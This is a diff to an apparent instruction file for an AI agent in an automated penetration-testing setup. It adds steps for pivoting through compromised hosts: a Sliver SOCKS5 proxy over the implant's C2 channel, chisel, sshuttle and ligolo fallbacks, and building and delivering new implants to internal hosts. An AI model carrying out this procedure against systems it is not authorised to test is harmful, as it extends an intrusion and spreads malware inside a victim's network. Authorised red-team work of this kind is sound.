@@ -74,12 +74,40 @@ For shell-server sessions (fallback or credential-based):
   Use mcp__shell-server__send_command(session_id="<id>", command="...") for interaction.
 ```
 
-## Pivoting (via Sliver)
+## [setup-pivot] Implementation — Sliver SOCKS5
 
-When the lead requests a pivot through a compromised host with a Sliver session:
+When the lead sends `[setup-pivot]` and you have a Sliver session on the pivot
+host, use Sliver's in-band SOCKS5 proxy — no additional tools needed:
+
+```
+1. Find the Sliver session on the pivot host: list_sessions()
+2. Start SOCKS5 proxy: start_socks_proxy(session_id)
+   → Returns endpoint (socks5://127.0.0.1:<port>) and proxychains config
+3. Verify connectivity: proxychains4 nc -zv <target_in_subnet> <port>
+4. Message state-mgr: [add-tunnel] tunnel_type=socks5-sliver remote_host=<ip>
+   remote_network=<cidr> local_port=<port> via_access_id=<N>
+5. Send [pivot-ready] to lead with endpoint and proxychains_line
+```
+
+**Sliver SOCKS5 tunnels traffic through the implant's C2 channel** — encrypted
+mTLS, no extra binary upload, no extra port on target. Equivalent to a chisel
+SOCKS proxy but zero-footprint.
+
+If you do NOT have a Sliver session on the pivot host (e.g. only shell-server
+access), fall back to loading the `pivoting-tunneling` skill:
+```
+ToolSearch("select:mcp__skill-router__get_skill")
+mcp__skill-router__get_skill(name="pivoting-tunneling")
+```
+Follow the skill methodology for chisel/sshuttle/ligolo setup.
+
+**C2-level pivoting** (routing a new implant through the pivot host to reach a
+deeper target) uses `start_pivot_listener`:
 ```
 1. start_pivot_listener(session_id, "tcp", bind_port=<port>)
-2. Generate new implant targeting the pivot host as callback
-3. Deliver pivot implant to internal target through the existing session
+2. Generate new implant: mtls_host=<pivot_host_ip>, mtls_port=<pivot_port>
+3. Deliver implant to internal target through existing session
 4. New Sliver session appears — routed through the pivot
 ```
+Use this when you need a full C2 session on an internal host, not just network
+routing. The lead will specify which approach is needed.
